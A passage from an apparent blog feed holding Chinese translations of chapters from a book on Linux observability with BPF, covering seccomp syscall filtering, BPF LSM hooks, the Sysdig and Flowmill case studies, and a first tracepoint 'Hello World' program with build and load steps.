class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    perror(<span class="string">"prctl(NO_NEW_PRIVS)"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class="line">  <span class="keyword">return</span> system(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译程序可以使用<code>clang</code>或<code>gcc</code>； </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang main.c -o filter-write</span><br></pre></td></tr></table></figure><p>我们已经阻止了程序中的所有写入。为了测试它，我们需要一个可以写的程序；<code>ls</code>似乎是一个不错的选择，下面是它的正常运行方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 2 root root  4096 Jun  4 10:10 .</span><br><span class="line">drwxr-xr-x 3 root root  4096 Jun  4 10:09 ..</span><br><span class="line">-rwxr-xr-x 1 root root 17832 Jun  4 10:10 filter-write</span><br><span class="line">-rw-r--r-- 1 root root  1210 Jun  4 10:10 main.c</span><br></pre></td></tr></table></figure><p>接着我们只需将要测试的程序作为第一个参数传递：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# ./filter-write "ls -la"</span><br></pre></td></tr></table></figure><p>执行后输出为空，我们可以使用<code>strace</code>来查看发生了什么：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos seccomp]# strace -f ./filter-write "ls -la"</span><br></pre></td></tr></table></figure><p>以下输出结果去掉了很多无用的输出，相关部分显示写入被EPERM错误阻止，这与我们设置的相同。 这意味着程序是执行成功的，因为它现在无法访问该系统调用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[pid 390331] write(2, "ls: ", 4)        = -1 EPERM (Operation not permitted)</span><br><span class="line">[pid 390331] write(2, "write error", 11) = -1 EPERM (Operation not permitted)</span><br><span class="line">[pid 390331] write(2, "\n", 1)          = -1 EPERM (Operation not permitted)</span><br></pre></td></tr></table></figure><p>现在你已经了解了Seccomp BPF的运作方式以及您可以用它做什么。 但是，如果有一种方法可以使用eBPF而不是cBPF实现同样的效果，那不是很好吗？</p><p>在考虑eBPF程序时，大多数人认为只是编写它们并以root权限加载它们。 尽管这句话通常是正确的，但内核实现了一套机制来保护各个级别的eBPF对象。 这些机制称为BPF LSM钩子。</p><h3 id="BPF-LSM钩子"><a href="#BPF-LSM钩子" class="headerlink" title="BPF LSM钩子"></a>BPF LSM钩子</h3><p>为了提供对系统事件的独立于体系结构的控制，LSM实现了钩子的概念。从技术上讲，钩子调用类似于系统调用。然而，独立于系统并与LSM框架集成使得钩子变得有趣，因为它提供的抽象层很方便，并且可以避免在不同架构上使用系统调用时可能发生的麻烦。</p><p>在撰写本文时，内核有七个与BPF程序相关的钩子，而SELinux是唯一实现它们的in-tree LSM。你可以在此文件的内核源码中看到这一点：<code>include/linux/security.h</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_map</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">fmode_t</span> fmode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_prog</span><span class="params">(struct bpf_prog *prog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_map_alloc</span><span class="params">(struct bpf_map *<span class="built_in">map</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">security_bpf_map_free</span><span class="params">(struct bpf_map *<span class="built_in">map</span>)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">security_bpf_prog_alloc</span><span class="params">(struct bpf_prog_aux *aux)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">security_bpf_prog_free</span><span class="params">(struct bpf_prog_aux *aux)</span></span>;</span><br></pre></td></tr></table></figure><p>每一个钩子都将在执行的不同阶段被调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">security_bpf：对已执行的BPF系统调用进行初始检查</span><br><span class="line">security_bpf_map：检查内核何时返回映射的文件描述符</span><br><span class="line">security_bpf_prog：检查内核何时返回eBPF程序的文件描述符</span><br><span class="line">security_bpf_map_alloc：是否初始化BPF映射中的安全字段</span><br><span class="line">security_bpf_map_free：是否清理BPF映射中的安全字段</span><br><span class="line">security_bpf_prog_alloc：是否在BPF程序中初始化安全字段</span><br><span class="line">security_bpf_prog_free：是否清理BPF程序中的安全字段</span><br></pre></td></tr></table></figure><h3 id="结论-3"><a href="#结论-3" class="headerlink" title="结论"></a>结论</h3><p>安全性不是一种以通用方式为你想要保护的所有内容实施的东西。能够以不同的方式在不同的层次上保护系统是很重要的，保护系统的最好方法是以不同的视角堆叠不同的层，这样一个受损的层就不会有能力访问整个系统。内核开发人员为我们提供了一组不同的层和交互点，我们希望能让你很好地理解层是什么以及如何使用BPF程序与它们进行交互。</p><h2 id="第九章节"><a href="#第九章节" class="headerlink" title="第九章节"></a>第九章节</h2><h3 id="Sysdig-eBPF-God-Mode"><a href="#Sysdig-eBPF-God-Mode" class="headerlink" title="Sysdig eBPF God Mode"></a>Sysdig eBPF God Mode</h3><p>制作同名开源Linux故障排除工具的公司<code>Sysdig</code>于2017年开始在内核4.11下使用eBPF。</p><p>过去该公司一直使用内核模块来提取和完成所有内核端工作，但随着用户群的增加以及越来越多的公司开始试验，该公司承认在许多方面对大多数外部行为是一种限制：</p><ul><li>越来越多的用户无法在他们的机器上加载内核模块。 云原生平台对运行时程序的功能越来越严格</li><li>新贡献者（甚至老贡献者）不了解内核模块的体系结构。这减少了贡献者的总数，并成为了项目本身发展的一个限制因素</li><li>内核模块的维护很困难，不仅仅是因为编写代码，还需要努力保持它的安全和组织良好</li></ul><p>出于这些动机，<code>Sysdig</code>决定尝试编写与模块中相同的一组功能，但改用eBPF程序的方法。 采用eBPF自动带来的另一个好处是<code>Sysdig</code>可以进一步利用其他不错的eBPF跟踪功能。 例如，使用用户探针将eBPF程序附加到用户空间应用程序中的特定执行点相对容易。</p><p>此外，该项目现在可以在eBPF程序中使用原生辅助函数功能来捕获正在运行的进程的堆栈跟踪，以增强典型的系统调用事件流。为用户提供了更多故障排除信息。</p><p>由于eBPF虚拟机的限制，<code>Sysdig</code>在开始最初面临一些挑战，因此该项目的首席架构师Gianluca Borello决定通过为内核本身提供上游补丁来改进它，包括：</p><ul><li>原生处理eBPF程序中的字符串的能力</li><li>多个补丁来改进eBPF程序，<a href="!https://patchwork.ozlabs.org/patch/840473/">1</a>,<a href="!https://patchwork.ozlabs.org/patch/840470/">2</a>,<a href="!https://patchwork.ozlabs.org/patch/840471/">3</a></li></ul><p>后者对于处理系统调用参数尤其重要，这或许是该工具中可用的最重要的数据源。</p><p>如下所示是Sysdig中的eBPF架构图</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/6.png" alt="6"></p><p>实现的核心是负责检测的自定义eBPF程序的集合。 这些程序是用C语言的一个子集编写的。 们是使用最新版本的<code>Clang</code>和<code>LLVM</code>编译的，它们将高级C代码转换为eBPF字节码。</p><p><code>Sysdig</code>检测内核的每个不同执行点都有一个eBPF程序。目前，eBPF程序附加到以下静态跟踪点：</p><ul><li>System call entry path</li><li>System call exit path</li><li>Process context switch</li><li>Process termination</li><li>Minor and major page faults</li><li>Process signal delivery</li></ul><p>每个程序接收执行点数据（例如，对于系统调用，调用进程传递的参数）并开始处理它们。 处理取决于系统调用的类型。 对于简单的系统调用，参数只是逐字复制到eBPF映射中，用于临时存储，直到形成整个事件框架。对于其他复杂的调用，eBPF程序包括翻译或扩充参数的逻辑。这使用户空间中的<code>Sysdig</code>应用程序能够充分利用数据。</p><p>一些附加数据包括以下内容：</p><ul><li>与网络连接相关的数据（TCP/UDP IPv4/IPv6 元组、UNIX套接字名称等）</li><li>与进程相关的指标（内存计数器、页面错误、套接字队列长度等）</li><li>容器特定数据，例如发出系统调用的进程所属的<code>cgroup</code>，以及进程所在的命名空间</li></ul><p>在上面<code>Sysdig</code>的eBPF架构图中，eBPF程序为特定系统调用捕获所有需要的数据后，使用一个特殊的本地BPF函数将数据推送到一组CPU的环形缓冲区，用户空间应用程序可以以非常高的吞吐量读取。 这不同于使用eBPF映射与用户空间共享内核空间中生成的“小数据”的典型范例。 </p><h3 id="Flowmill"><a href="#Flowmill" class="headerlink" title="Flowmill"></a>Flowmill</h3><p>Flowmill是一家可观测性初创公司，其创始人乔纳森·佩里（Jonathan Perry）从一个名为<code>Flowtune</code>的学术研究项目中脱颖而出。<code>Flowtune</code>研究了如何在拥塞的数据中心网络中有效地调度单个数据包。这项工作所需的核心技术之一是以极低的开销收集网络遥测数据的方法。Flowmill最终采用了这项技术来观察、聚合和分析分布式应用程序中每个组件之间的连接，以执行以下操作：</p><ul><li>提供服务如何在分布式系统中交互的准确视图</li><li>统计流量速率、错误或延迟显着变化的区域</li></ul><p>Flowmill使用eBPF内核探针来跟踪每个打开的套接字并定期捕获它们的操作系统指标。这很复杂，原因有很多：</p><ul><li>在建立 eBPF 探针时，有必要检测新连接和已经打开的现有连接。 此外，它必须考虑到TCP和UDP以及通过内核的IPv4和IPv6代码路径。</li><li>对于基于容器的系统，每个套接字都必须归属于相应的<code>cgroup</code>，并与来自Kubernetes或Docker等平台的编排器元数据相结合。</li><li>必须对通过<code>conntrack</code>执行的网络地址转换进行检测，以建立套接字与其外部可见IP地址之间的映射。 例如，在Docker中，常见的网络模型使用源NAT来伪装主机IP地址和Kubernetes后面的容器，并使用服务虚拟IP地址来表示一组容器。</li><li>eBPF程序收集的数据必须经过后处理，以按服务提供聚合并匹配在连接两侧收集的数据。</li></ul><p>然而，添加eBPF内核探针提供了一种更有效和更强大的方式来收集这些数据。它消除了丢失连接的风险，并且可以在秒级间隔内以低开销在每个套接字上完成。Flowmill的方法依赖一个代理，该代理结合了一组eBPF kprobes和用户空间指标收集以及机外聚合和后处理。该实现大量使用Perf环将在每个套接字上收集的指标传递到用户空间以做进一步处理。此外，它使用哈希映射来跟踪打开的TCP和UDP套接字。</p><p>例如，<code>tcp_v4_do_rcv</code>捕获所有已建立的TCP RX流量并可以访问<code>struct sock</code>，但调用量非常大。相反，用户可以检测处理ACK、乱序数据包处理、RTT预测等功能，从而允许处理影响已知指标的特定事件。</p><p>使用这种跨TCP、UDP、进程、容器、conntrack和其他子系统的方法可以实现非常好的系统性能，并且开销足够低，这在大多数系统中是难以测量的。CPU开销通常为每个内核0.1%到0.25%，包括eBPF和用户空间组件，主要取决于创建新套接字的速率。</p><p>Sysdig和Flowmill是使用BPF构建监控和可观察性工具的先驱，但他们并不是唯一的。 在整本书中，我们提到了其他公司，如Cillium和Facebook，它们采用BPF作为框架来提供高度安全和高性能的网络基础设施。 对于BPF的未来我们是充满期待的！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第五章节&quot;&gt;&lt;a href=&quot;#第五章节&quot; class=&quot;headerlink&quot; title=&quot;第五章节&quot;&gt;&lt;/a&gt;第五章节&lt;/h2&gt;&lt;h3 id=&quot;BPF实用程序&quot;&gt;&lt;a href=&quot;#BPF实用程序&quot; class=&quot;headerlink&quot; title=&quot;BPF
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>使用BPF的Linux可观测性(上篇)-翻译</title>
    <link href="elssm.github.io/2022/05/27/%E4%BD%BF%E7%94%A8BPF%E7%9A%84Linux%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7-%E4%B8%8A%E7%AF%87-%E7%BF%BB%E8%AF%91/"/>
    <id>elssm.github.io/2022/05/27/使用BPF的Linux可观测性-上篇-翻译/</id>
    <published>2022-05-27T08:18:52.000Z</published>
    <updated>2022-05-27T08:23:08.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一章节"><a href="#第一章节" class="headerlink" title="第一章节"></a>第一章节</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>过去十几年计算机系统变得越来越复杂。关于如何获取软件的行为就已经创造了很多的业务类别，这些业务类别都试图解决观测复杂系统的挑战。一种可观测的方法是分析运行在系统中的程序所产生的数据日志，日志是一种很好的信息源，它们可以为您提供有关应用程序行为的精确数据，然而事实是你只能获取到工程师在创建该程序时暴露在外面的日志信息。从任何系统收集日志格式的信息都可能像反编译程序和查看执行流一样具有挑战性。另一种比较流行的方法是使用指标来解释程序的行为方式。指标在数据格式上不同于日志；日志为你提供了明确的数据，而指标则聚合数据来衡量程序在特定时间点的行为。</p><p>可观测性是一种从不同角度处理这个问题的新兴实践。人们将可观测性定义为我们必须提出任意问题并从任何给定系统接收复杂答案的能力。可观测性、日志和指标聚合之间的一个关键区别在于你所收集的数据。鉴于通过实践可观测性你需要在任何时间点回答任意问题，对数据进行推理的唯一方法是收集系统可以生成的所有数据，并仅在需要回答问题时对其进行聚合。</p><p>黑天鹅事件在软件工程中比我们想象的更普遍，而且是不可避免的。因为我们可以假设我们无法阻止此类事件，所以我们唯一的选择是拥有尽可能多的关于它们的信息来解决它们，而不会对业务系统造成严重影响。可观测性帮助我们构建强大的系统并减轻未来会发生的黑天鹅事件，因为它基于你收集的任何数据可以回答未来所发生的任何问题的前提。对黑天鹅事件的研究和实践可观测性集中在一个中心点，即你从系统收集的数据中。</p><p>Linux容器是Linux内核上一组功能的抽象，用于隔离和管理计算机进程。传统上负责资源管理的内核还提供任务隔离和安全性。在Linux中，容器主要基于<code>namespaces</code>和<code>cgroups</code>。<code>namespaces</code>是将任务彼此隔离的组件。从某种意义上说，当你在一个<code>namespaces</code>中时，你会体验到操作系统就像没有其他任务在计算机上运行一样。<code>cgroups</code> 是提供资源管理的组件。从操作的角度来看，它们可以让你对任何资源使用情况进行细粒度控制，例如 CPU、磁盘 I/O、网络等。在过去十年中，随着Linux容器的普及，软件工程师设计大型分布式系统和计算平台的方式发生了转变。多租户计算已经完全依赖于内核中的这些特性。</p><p>通过如此依赖 Linux 内核的低级功能，我们挖掘了一个新的复杂性和信息来源，我们在设计可观察系统时需要考虑这些来源。内核是一个事件系统，这意味着所有的工作都是基于事件来描述和执行的。打开文件是一种事件，CPU执行任意指令是一种事件，接收网络数据包是一种事件等等。<code>Berkeley Packet Filter</code> (BPF) 是内核中的一个子系统，可以检查这些新的信息源。BPF允许你编写在内核触发任何事件时安全执行的程序。 BPF为你提供强大的安全保证，以防止你在这些程序中注入使系统崩溃的恶意行为。 BPF正在开发新一轮工具，帮助系统开发人员观察和使用这些新平台。</p><h3 id="BPF历史"><a href="#BPF历史" class="headerlink" title="BPF历史"></a>BPF历史</h3><p>1992年的时候出现了一篇名为“The BSD Packet Filter: A New Architecture for User-Level Packet Capture”的论文，在该论文中，作者描述了他们如何为Unix内核实现网络数据包过滤器，该过滤器的速度比当时最先进的数据包过滤器快20倍。包过滤器有一个特定的目的：为监控系统网络的应用程序提供来自内核的直接信息。有了这些信息，应用程序就可以决定如何处理这些数据包。 BPF 在包过滤方面引入了两大创新：</p><ul><li>一种新的虚拟机 (VM)，旨在与基于寄存器的CPU高效工作。</li><li>每个应用程序缓冲区的使用，可以在不复制所有数据包信息的情况下过滤数据包。这最大限度地减少了决策所需的BPF数据量。</li></ul><p>这些巨大的改进使所有Unix系统都采用BPF作为网络数据包过滤的首选技术，放弃了消耗更多内存且性能较低的旧实现。 这种实现仍然存在于该Unix内核的许多衍生产品中，包括Linux内核。</p><p>2014年的时候，Alexei Starovoitov介绍了eBPF的实现。这种新设计针对现代硬件进行了优化，使其生成的指令集比旧BPF解释器生成的机器代码更快。这个扩展版本还将BPF VM中的寄存器数量从两个32位寄存器增加到十个64位寄存器。寄存器数量和位宽的增加为编写更复杂的程序提供了可能性，因为开发人员可以使用函数参数自由地交换更多信息。 这些更改以及其他改进使扩展的BPF版本比原始BPF实现快了四倍。</p><p>这个新实现的最初目标是优化处理网络过滤器的内部BPF指令集。此时，BPF仍然受限于内核空间，只有少数用户空间的程序可以编写BPF过滤器供内核处理，如<code>Tcpdump</code>和<code>Seccomp</code>，今天，这些程序仍然为旧的BPF解释器生成字节码，但内核将这些指令翻译为改进更大的内部表示。</p><p>2014年6月，BPF的扩展版本被暴露给用户空间。 这是BPF的一个转折点。 正如Alexei在引入这些更改的补丁中所写的那样，“这个补丁集展示了eBPF的潜力。”</p><p>BPF成为顶级内核子系统，不再局限于网络堆栈。 BPF程序开始看起来更像内核模块，非常强调安全性和稳定性。 与内核模块不同，BPF程序不需要你重新编译你的内核，并且它们可以保证在不崩溃的情况下完成。</p><p>BPF验证器确保任何BPF程序都将在不崩溃的情况下完成，并确保程序不会尝试访问超出范围的内存。但是，这些优势伴随着某些限制：程序具有允许的最大大小，并且需要限制循环以确保系统的内存永远不会被错误的BPF程序耗尽。</p><p>随着使BPF可以从用户空间访问的更改，内核开发人员还添加了一个新的系统调用，<code>bpf</code>。 这个新的系统调用将成为用户空间和内核之间通信的中心部分。<code>BPF maps</code>将成为内核和用户空间之间交换数据的主要机制。eBPF是本书的起点。 在过去的五年中，BPF自从引入这个扩展版本以来已经发生了显着的变化，我们详细介绍了BPF程序的演变、<code>BPF map</code>和受这种演变影响的内核子系统。</p><h3 id="BPF结构"><a href="#BPF结构" class="headerlink" title="BPF结构"></a>BPF结构</h3><p>正如前面提到的，BPF是一种高度先进的虚拟机，在隔离环境中运行代码指令。 从某种意义上说，你可以将BPF视为你对Java虚拟机(JVM)的看法，这是一个运行由高级编程语言编译的机器代码的专用程序。LLVM之类的编译器和不久的将来的<code>GNU Compiler Collection(GCC)</code>都提供对BPF的支持，允许你将C代码编译成BPF指令。在你的代码被编译之后，BPF使用一个验证器来确保内核可以安全地运行程序。 它可以防止你运行可能使内核崩溃而危及系统的代码。如果你的代码是安全的，BPF程序将被加载到内核中。 Linux内核还包含一个用于BPF指令的即时(JIT)编译器。JIT将在程序验证后直接将BPF字节码转换为机器码，避免了执行时间上的这种开销。这种架构的一个有趣的点是你不需要重新启动系统来加载BPF程序。 你可以按需加载它们，也可以编写自己的初始化脚本，在系统启动时加载BPF程序。</p><p>在内核运行任何BPF程序之前，它需要知道程序<code>attach</code>到了哪个执行点。内核有很多附着点，而且这个数量还在不断增加。当您选择一个执行点时，内核还提供了特定的函数助手，您可以使用它们来处理程序接收到的数据，从而使执行点和BPF程序紧密耦合。</p><p>BPF架构中最后的组件主要负责用户态和内核态之间的数据交换，这个组件叫做<code>BPF map</code>，<code>BPF map</code>是共享数据的双向结构，这意味着你可以从内核和用户空间的两侧写入和读取它们。<code>BPF map</code>有几种类型的结构，从简单的数组和<code>hash map</code>到专门的map，允许你将整个BPF程序保存在其中。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>我们写这本书是为了帮助你熟悉在日常使用这个Linux子系统时需要用到的基本BPF概念。 BPF仍然是一项正在发展的技术，在我们编写本书的过程中，新的概念和范式也在不断发展。 理想情况下，本书将为你提供BPF基础组件的坚实基础，从而帮助您轻松扩展知识。</p><p>下一章将直接深入BPF程序的结构以及内核如何运行它们。 它还涵盖了内核中可以<code>attach</code>这些程序的点。 这将帮助你熟悉程序可以使用的所有数据以及如何使用这些数据。</p><h2 id="第二章节"><a href="#第二章节" class="headerlink" title="第二章节"></a>第二章节</h2><h3 id="第一个BPF程序"><a href="#第一个BPF程序" class="headerlink" title="第一个BPF程序"></a>第一个BPF程序</h3><p>BPF虚拟机能够运行指令以响应内核触发的事件。然而，并不是所有的BPF程序都可以访问内核触发的所有事件。当你将一个程序加载到BPF虚拟机中时，你需要决定你正在运行哪种类型的程序。这会通知内核你的程序将被触发的位置。它还告诉BPF验证器在你的程序中将允许哪些助手。当你选择程序类型时，你也在选择程序正在实现的接口。 该接口确保你可以访问适当类型的数据，以及你的程序是否可以直接访问网络数据包。</p><p>多年来，内核开发人员一直在添加不同的入口点，你可以将 BPF 程序<code>attach</code>到这些入口点。 这项工作还没有完成，他们每天都在寻找利用BPF的新方法。 在本章中，我们将重点介绍一些最有用的程序类型，目的是让你了解使用BPF可以做什么。 我们将在以后的章节中讨论如何编写BPF程序的许多其他示例。</p><p>本章还将介绍BPF验证器在运行程序中所扮演的角色。 该组件验证你的代码是否可以安全执行，并帮助你编写不会导致意外结果的程序，例如内存耗尽或内核突然崩溃。 </p><h3 id="编写BPF程序"><a href="#编写BPF程序" class="headerlink" title="编写BPF程序"></a>编写BPF程序</h3><p>编写BPF程序的最常见方法是使用<code>LLVM</code>编译的C语言子集。<code>LLVM</code>是一种通用编译器，可以输出不同类型的字节码。在这种情况下，<code>LLVM</code>将输出BPF汇编代码，之后我们会将代码加载到内核中。我们会在以后的章节中展示 BPF汇编的简短示例，编写汇编比C语言更合适，例如<code>Seccomp</code>过滤器来控制内核中的传入系统调用。内核提供系统调用bpf来在程序编译后将它们加载到BPF虚拟机中。 该系统调用用于加载程序之外的其他操作，你将在后面的章节中看到更多使用示例。 内核还提供了一些实用工具，可以为你抽象BPF程序的加载。在第一个代码示例中，我们将展示BPF的“Hello World”示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"tracepoint/syscalls/sys_enter_execve"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">bpf_prog</span><span class="params">(<span class="keyword">void</span> *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> msg[] = <span class="string">"Hello, BPF World!"</span>; </span><br><span class="line">  bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>在上面的程序中有一些简单的概念。当我们想要运行这个程序时，我们使用属性<code>SEC</code>来通知BPF虚拟机。在上面BPF例子中，当检测到<code>execve</code>系统调用中的跟踪点时，我们将运行这个BPF程序。跟踪点是内核二进制代码中的静态标记，允许开发人员注入代码来检查内核的执行。所以我们将看到消息<code>Hello，BPF World！</code>每当内核检测到一个程序执行另一个程序时。</p><p>在这个例子的最后，我们还指定了这个程序的许可证。因为Linux内核是在GPL下获得许可的，所以它也只能加载获得GPL许可的程序。 如果我们将许可证设置为其他内容，内核将拒绝加载我们的程序。我们正在使用    <code>bpf_trace_printk</code>在内核跟踪日志中打印一条消息； 该消息你可以在<code>/sys/kernel/debug/tracing/trace_pipe</code>路径下找到此日志。</p><p>我们将使用<code>Clang</code>将第一个程序编译为有效的ELF二进制文件。这是内核期望加载的格式。我们将把我们的第一个程序保存在一个名为<code>bpf_program.c</code>的文件中，以便编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>在这里编译的时候遇到了一个错误。具体报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bpf_program.c:7:3: warning: implicit declaration of function 'bpf_trace_printk' is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">  bpf_trace_printk(msg, sizeof(msg)); </span><br><span class="line">  ^</span><br><span class="line">1 warning generated.</span><br></pre></td></tr></table></figure><p>解决方法：<a href="https://github.com/iovisor/gobpf/issues/267" target="_blank" rel="noopener">https://github.com/iovisor/gobpf/issues/267</a></p><p>重新编译得到<code>bpf_program.o</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -I bpf_helpers.h -o bpf_program.o</span><br></pre></td></tr></table></figure><p>现在我们已经编译了第一个BPF程序，需要将它加载到内核中。我们使用内核提供的特殊帮助器来抽象编译和加载程序。这个帮助程序称为<code>load_bpf_file</code>，它需要一个二进制文件并尝试将其加载到内核中。程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;uapi/linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf_load.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (load_bpf_file(<span class="string">"bpf_program.o"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The kernel didn't load the BPF program\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line">read_trace_pipe(); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将使用脚本来编译该程序并将其链接为ELF二进制文件。 在这种情况下，我们不需要指定目标，因为该程序不会加载到BPF虚拟机中。 我们需要使用一个外部库，并且编写一个脚本可以更容易地将它们放在一起。</p><p>具体的执行流程如下链接所示</p><p><a href="https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world" target="_blank" rel="noopener">https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world</a></p><p>这里需要注意在Makefile中需要将<code>kernel-src</code>修改为你的内核源代码路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# make bpfload</span><br><span class="line">clang -O2 -target bpf -c bpf_program.c -I/root/linux-5.4/tools/testing/selftests/bpf -o bpf_program.o</span><br><span class="line">clang -DHAVE_ATTR_TEST=0 -o monitor-exec -lelf -I/root/linux-5.4/samples/bpf -I/root/linux-5.4/tools/lib -I/root/linux-5.4/tools/perf -I/root/linux-5.4/tools/include -L/usr/local/lib64 -lbpf \</span><br><span class="line">        /root/linux-5.4/samples/bpf/bpf_load.c loader.c</span><br><span class="line">[root@VM-16-14-centos bpf]# ls</span><br><span class="line">Makefile  bpf_helpers.h  bpf_program.c  bpf_program.o  loader.c  monitor-exec</span><br></pre></td></tr></table></figure><p>当你运行这个程序时，你会开始看到我们的Hello, BPF World！ 几秒钟后的消息，即使您没有对计算机执行任何操作。 这是因为在您的计算机后台运行的程序可能正在执行其他调用了<code>execve</code>的程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 